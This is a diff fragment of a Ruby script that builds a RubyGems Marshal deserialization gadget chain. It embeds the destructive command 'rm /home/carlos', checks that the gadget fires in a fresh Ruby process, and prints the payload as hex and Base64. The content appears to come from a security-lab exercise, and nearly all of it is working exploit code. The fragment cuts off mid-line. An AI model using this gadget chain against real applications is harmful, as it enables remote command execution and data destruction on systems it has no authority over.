@@ -16,12 +16,14 @@ class Gem::StubSpecification
   def initialize; end
 end
 
+
 stub_specification = Gem::StubSpecification.new
 stub_specification.instance_variable_set(:@loaded_from, "rm /home/carlos")
 
 puts "STEP n"
 stub_specification.name rescue nil
 puts
+
 
 class Gem::Source::SpecificFile
   def initialize; end
@@ -36,12 +38,14 @@ puts "STEP n-1"
 specific_file <=> other_specific_file rescue nil
 puts
 
+
 $dependency_list= Gem::DependencyList.new
 $dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])
 
 puts "STEP n-2"
 $dependency_list.each{} rescue nil
 puts
+
 
 class Gem::Requirement
   def marshal_dump
@@ -55,6 +59,7 @@ puts "STEP n-3"
 Marshal.load(payload) rescue nil
 puts
 
+
 puts "VALIDATION (in fresh ruby process):"
 IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
   pipe.print payload
@@ -67,7 +72,10 @@ puts "Payload (hex):"
 puts payload.unpack('H*')[0]
 puts
 
+
 require "base64"
 puts "Payload (Base64 encoded):"
 puts Base64.encode64(payload
 ```
+
+
